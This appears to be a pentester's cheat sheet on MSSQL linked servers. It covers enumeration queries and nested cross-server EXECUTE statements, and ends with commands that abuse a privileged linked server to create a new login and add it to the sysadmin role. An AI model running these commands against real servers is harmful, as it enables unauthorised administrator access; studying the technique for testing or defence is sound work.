---
title: "MSSQL Linked Servers"
date: 2024-6-27
tags: ["mssql", "database", "Windows", "linked_server", "privilege escalation"]
---

---
###  Linked Servers

#### Basic Commands

<small>*Hint: Use double `''` to escape `'` in mssql*</small>

```mysql
# Show current server
select @@servername

# Show linked servers
select srvname from sysservers;
```

#### Execute Query between Linked Servers

```mysql
# Execute query from current server to linked server
EXECUTE ('select @@version;') at [DOMAIN\LINKED_SERVER];

# Execute query from linked server to current server
EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [DOMAIN\CURRENT_SERVER]') at [DOMAIN\LINKED_SERVER];
```

### Privilege Escalation

#### Create Admin User from Privilege Linked Server

```mysql
EXECUTE('EXECUTE(''CREATE LOGIN test WITH PASSWORD = ''''Test1234!@'''';'') AT [DOMAIN\CURRENT_SERVER]') AT [DOMAIN\LINKED_SERVER]
EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''test'''', ''''sysadmin'''''') AT [DOMAIN\CURRENT_SERVER]') AT [DOMAIN\LINKED_SERVER]
```